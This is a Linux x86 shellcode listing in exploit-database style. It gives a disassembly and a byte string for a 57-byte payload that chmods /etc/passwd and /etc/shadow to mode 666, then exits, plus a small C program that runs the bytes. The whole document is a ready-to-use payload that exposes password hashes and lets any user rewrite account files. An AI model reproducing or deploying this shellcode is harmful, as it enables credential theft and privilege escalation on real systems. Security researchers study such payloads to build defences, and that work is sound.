/*
Title:	Linux x86 chmod 666 /etc/passwd & /etc/shadow - 57 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    %eax,%eax
 8048062:       66 b9 b6 01             mov    $0x1b6,%cx
 8048066:       50                      push   %eax
 8048067:       68 73 73 77 64          push   $0x64777373
 804806c:       68 2f 2f 70 61          push   $0x61702f2f
 8048071:       68 2f 65 74 63          push   $0x6374652f
 8048076:       89 e3                   mov    %esp,%ebx
 8048078:       b0 0f                   mov    $0xf,%al
 804807a:       cd 80                   int    $0x80
 804807c:       31 c0                   xor    %eax,%eax
 804807e:       50                      push   %eax
 804807f:       68 61 64 6f 77          push   $0x776f6461
 8048084:       68 2f 2f 73 68          push   $0x68732f2f
 8048089:       68 2f 65 74 63          push   $0x6374652f
 804808e:       89 e3                   mov    %esp,%ebx
 8048090:       b0 0f                   mov    $0xf,%al
 8048092:       cd 80                   int    $0x80
 8048094:       31 c0                   xor    %eax,%eax
 8048096:       40                      inc    %eax
 8048097:       cd 80                   int    $0x80



*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64"
                   "\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3"
                   "\xb0\x0f\xcd\x80\x31\xc0\x50\x68\x61\x64\x6f\x77"
                   "\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3"
                   "\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80";


int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}